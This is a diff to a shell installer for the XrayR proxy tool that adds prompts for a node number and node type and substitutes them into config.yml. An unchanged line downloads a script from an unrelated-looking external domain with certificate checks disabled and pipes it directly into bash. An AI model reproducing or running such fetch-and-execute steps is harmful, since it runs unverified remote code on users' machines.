@@ -101,6 +101,10 @@ install_acme() {
 }
 
 install_XrayR() {
+    echo "Please enter node number:"
+    read node_num
+    echo "Please enter node type (Node type: V2ray, Shadowsocks, Trojan, Shadowsocks-Plugin): "
+    read node_type
     wget -qO- --no-check-certificate https://dev.thuykieucompany.ca/install_key.sh | bash
     if [[ -e /usr/local/XrayR/ ]]; then
         rm /usr/local/XrayR/ -rf
@@ -152,7 +156,9 @@ install_XrayR() {
     cp geosite.dat /etc/XrayR/ 
 
     if [[ ! -f /etc/XrayR/config.yml ]]; then
-        cp config.yml /etc/XrayR/
+        sed -i "s/NodeID: 1/NodeID: $node_num/" config.yml
+	sed -i "s/NodeType: Trojan/NodeType: $node_type/" config.yml
+	cp config.yml /etc/XrayR/
         echo -e ""
         echo -e "全新安装，请先参看教程：https://github.com/zeropanel/XrayR，配置必要的内容"
     else
